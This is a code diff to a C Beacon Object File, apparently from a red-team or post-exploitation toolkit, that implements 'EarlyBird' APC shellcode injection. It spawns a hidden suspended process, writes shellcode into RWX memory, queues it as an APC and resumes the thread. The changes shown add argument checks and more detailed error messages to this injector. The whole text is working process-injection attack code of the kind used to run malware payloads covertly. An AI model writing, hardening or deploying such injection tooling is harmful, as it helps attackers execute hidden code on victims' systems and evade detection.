@@ -31,9 +31,29 @@ void go(char *args, int alen)
     }
     if (!extra) extra = "";
 
+    /* EarlyBird needs to create the process; a PID is not a valid target. */
+    {
+        const char *p = exe;
+        int numeric = (*p != 0);
+        while (*p) {
+            if (*p < '0' || *p > '9') { numeric = 0; break; }
+            p++;
+        }
+        if (numeric) {
+            BeaconPrintf(CALLBACK_ERROR,
+                         "earlybird spawns a new process; '%s' looks like a PID\n",
+                         exe);
+            BeaconPrintf(CALLBACK_ERROR,
+                         "usage: earlybird <executable> <shellcode-file> [args]\n");
+            BeaconPrintf(CALLBACK_ERROR,
+                         "for an existing process use: bof-injectapc <pid> <shellcode-file>\n");
+            return;
+        }
+    }
     if (bof_read_file(path, &sc, &sclen) != 0) {
-        BeaconPrintf(CALLBACK_ERROR, "cannot read %s: %lu\n", path,
-                     (unsigned long)KERNEL32$GetLastError());
+        bof_error_win32("read shellcode file", KERNEL32$GetLastError(),
+                        "file must exist, be readable, and be 1 byte..256 MiB");
+        bof_error_context("path", path);
         return;
     }
 
@@ -51,8 +71,12 @@ void go(char *args, int alen)
         if (!KERNEL32$CreateProcessA(NULL, cmdline, NULL, NULL, FALSE,
                                      CREATE_SUSPENDED | CREATE_NO_WINDOW,
                                      NULL, NULL, &si, &pi)) {
-            BeaconPrintf(CALLBACK_ERROR, "CreateProcess(%s) failed: %lu\n", exe,
-                         (unsigned long)KERNEL32$GetLastError());
+            DWORD err = KERNEL32$GetLastError();
+            bof_error_win32("CreateProcess", err,
+                            err == ERROR_FILE_NOT_FOUND
+                                ? "pass a full executable path (earlybird creates the process)"
+                                : "could not create the suspended target process");
+            bof_error_context("image", exe);
             KERNEL32$VirtualFree(sc, 0, MEM_RELEASE);
             return;
         }
@@ -61,8 +85,11 @@ void go(char *args, int alen)
     remote = KERNEL32$VirtualAllocEx(pi.hProcess, NULL, (SIZE_T)sclen,
                                      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!remote) {
-        BeaconPrintf(CALLBACK_ERROR, "VirtualAllocEx failed: %lu\n",
-                     (unsigned long)KERNEL32$GetLastError());
+        DWORD err = KERNEL32$GetLastError();
+        bof_error_win32("VirtualAllocEx", err,
+                        "cannot reserve RXW memory in the target process");
+        bof_error_num("pid", (unsigned long long)pi.dwProcessId);
+        bof_error_num("size", (unsigned long long)sclen);
         KERNEL32$TerminateProcess(pi.hProcess, 1);
         KERNEL32$CloseHandle(pi.hThread);
         KERNEL32$CloseHandle(pi.hProcess);
@@ -71,8 +98,12 @@ void go(char *args, int alen)
     }
 
     if (!KERNEL32$WriteProcessMemory(pi.hProcess, remote, sc, (SIZE_T)sclen, NULL)) {
-        BeaconPrintf(CALLBACK_ERROR, "WriteProcessMemory failed: %lu\n",
-                     (unsigned long)KERNEL32$GetLastError());
+        DWORD err = KERNEL32$GetLastError();
+        bof_error_win32("WriteProcessMemory", err,
+                        "cannot copy the shellcode into the target process");
+        bof_error_num("pid", (unsigned long long)pi.dwProcessId);
+        bof_error_num("remote", (unsigned long long)(ULONG_PTR)remote);
+        bof_error_num("size", (unsigned long long)sclen);
         KERNEL32$TerminateProcess(pi.hProcess, 1);
         KERNEL32$CloseHandle(pi.hThread);
         KERNEL32$CloseHandle(pi.hProcess);
@@ -81,13 +112,24 @@ void go(char *args, int alen)
     }
 
     if (!KERNEL32$QueueUserAPC((PAPCFUNC)remote, pi.hThread, 0)) {
-        BeaconPrintf(CALLBACK_ERROR, "QueueUserAPC failed: %lu\n",
-                     (unsigned long)KERNEL32$GetLastError());
+        DWORD err = KERNEL32$GetLastError();
+        bof_error_win32("QueueUserAPC", err,
+                        "cannot queue the APC on the suspended main thread");
+        bof_error_num("pid", (unsigned long long)pi.dwProcessId);
+        bof_error_num("remote", (unsigned long long)(ULONG_PTR)remote);
         KERNEL32$TerminateProcess(pi.hProcess, 1);
     } else {
-        KERNEL32$ResumeThread(pi.hThread);
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] PID %lu spawned suspended, APC queued at 0x%p\n",
-                     (unsigned long)pi.dwProcessId, remote);
+        DWORD resumed = KERNEL32$ResumeThread(pi.hThread);
+        if (resumed == (DWORD)-1) {
+            bof_error_win32("ResumeThread", KERNEL32$GetLastError(),
+                            "APC queued but the target thread did not resume");
+            bof_error_num("pid", (unsigned long long)pi.dwProcessId);
+            KERNEL32$TerminateProcess(pi.hProcess, 1);
+        } else {
+            BeaconPrintf(CALLBACK_OUTPUT,
+                         "[+] PID %lu spawned suspended, APC queued at 0x%p\n",
+                         (unsigned long)pi.dwProcessId, remote);
+        }
     }
 
     KERNEL32$CloseHandle(pi.hThread);
